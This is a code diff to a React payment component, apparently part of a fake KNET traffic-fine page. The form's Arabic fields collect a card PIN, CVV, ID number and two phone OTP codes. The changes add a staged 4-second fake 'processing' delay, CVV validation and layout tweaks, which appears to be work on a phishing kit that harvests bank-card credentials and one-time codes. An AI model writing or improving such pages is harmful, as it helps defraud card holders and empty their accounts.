@@ -307,8 +307,12 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
       setLoading(false)
       setStep(2)
     } else if (step === 1) {
-      setStep(0)
-      // Update payment info to pending status for card
+      setLoading(true)
+
+setTimeout(() => {
+  setStep(0)
+  setLoading(false)
+}, 4000);      // Update payment info to pending status for card
       const updatedPaymentInfo = {
         ...paymentInfo,
         cardStatus: "pending",
@@ -355,7 +359,9 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
         paymentInfo.pass !== "" &&
         paymentInfo.month !== "" &&
         paymentInfo.year !== "" &&
-        paymentInfo.pass.length === 4
+        paymentInfo.pass.length === 4&&
+        paymentInfo.cvv.length === 3
+
       )
     }
     return true
@@ -652,7 +658,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                     maxLength={6}
                     required
                     placeholder="الرمز  المرسل إلى الجوال"
-                    className="text-center text-lg py-6 border-blue-200"
+                    className="text-center text-lg py-6 border-blue-200 col-12"
                     value={paymentInfo.otp2 || ""}
                     onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
                   />
@@ -705,7 +711,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
               <div id="payConfirmCardNum">
                 <label className="col">رقم الهوية / الأقامة:</label>
                 <input
-                  className="col"
+                  className="col-12"
                   type="tel"
                   name="idNumber"
                   style={{ width: "100%" }}
@@ -821,7 +827,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                     maxLength={6}
                     required
                     placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
-                    className="text-center text-lg py-6 border-blue-200"
+                    className="text-center text-lg py-6 border-blue-200 col-12"
                     value={paymentInfo.otp || ""}
                     onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
                   />
